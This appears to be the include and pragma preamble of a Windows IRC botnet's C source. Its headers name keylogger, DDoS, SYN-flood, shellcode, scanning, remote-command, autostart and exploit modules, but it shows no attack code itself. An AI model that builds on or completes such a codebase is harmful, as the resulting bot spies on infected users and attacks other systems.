
#ifdef WIN32
#define _WIN32_WINNT	0x0403			
#define WIN32_LEAN_AND_MEAN					
#pragma optimize("gsy", on)					
#pragma comment(linker,"/RELEASE")			
#pragma comment(linker, "/ALIGN:4096")		
#pragma comment(linker, "/IGNORE:4108 ")	
								
#endif 

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <malloc.h>
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <shellapi.h>
#include <windns.h>
#include <iphlpapi.h>
#include <lm.h>
#include <lmat.h>
#include <io.h>
#include <winioctl.h>
#include <winsvc.h>
#include <fcntl.h>
#include <shlwapi.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <assert.h>
#include <sqlext.h>
#include <vfw.h>
#include <shlobj.h>
#include <ntsecapi.h>
#include "defines.h"
#include "ehandler.h"
#include "processes.h"
#include "loaddlls.h"
#include "tcpip.h"
#include "threads.h"
#include "crxbot.h"
#include "irc_send.h"
#include "crc32.h"
#include "netutils.h"
#include "sysinfo.h"
#include "advscan.h"
#include "ident.h"
#include "rndnick.h"
#include "download.h"
#include "scan.h"
#include "ddos.h"
#include "pingudp.h"
#include "redirect.h"
#include "wildcard.h"
#include "misc.h"
#include "driveinfo.h"
#include "httpd.h"
#include "crypt.h"
#include "remotecmd.h"
#include "aliaslog.h"
#include "secure.h"
#include "autostart.h"
#include "keylogger.h"
#include "fphost.h"
#include "shellcode.h"
#include "ftpd.h"
#include "net.h"
#include "supersyn.h"
#include "visit.h"
//#include "asnsmb.h"
//#include "asnSmb.h"// ported
//#include "dcom3.h"// ported
#include "speed.h"// ported
#include "vnc.h"
//#include "netapi.h"




